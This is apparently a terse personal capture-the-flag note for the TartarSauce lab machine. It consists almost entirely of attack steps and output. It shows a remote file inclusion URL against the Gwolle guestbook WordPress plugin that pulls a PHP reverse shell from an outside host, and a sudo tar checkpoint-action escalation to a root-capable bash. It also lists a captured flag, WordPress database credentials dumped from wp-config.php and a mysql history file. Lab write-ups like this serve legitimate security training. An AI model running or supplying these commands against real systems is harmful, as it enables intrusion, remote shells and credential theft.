name a php-reverse-shell file as wp-load.php, Host it, and it will grab it.

http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.15/


sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

UFLAG: b2d6ec45472467c836f253bd170182c7



[+] Looking for Wordpress wp-config.php files                                                                                          
wp-config.php files found:\n/var/www/html/webservices/wp/wp-config.php                                                                 
define('DB_NAME', 'wp');                                                                                                               
define('DB_USER', 'wpuser');                                                                                                           
define('DB_PASSWORD', 'w0rdpr3$$d@t@b@$3@cc3$$');                                                                                      
define('DB_HOST', 'localhost');                




onuma@TartarSauce:~$ cat .mysql_history                                                                                                
cat .mysql_history
_HiStOrY_V2_
create\040database\040backuperer; 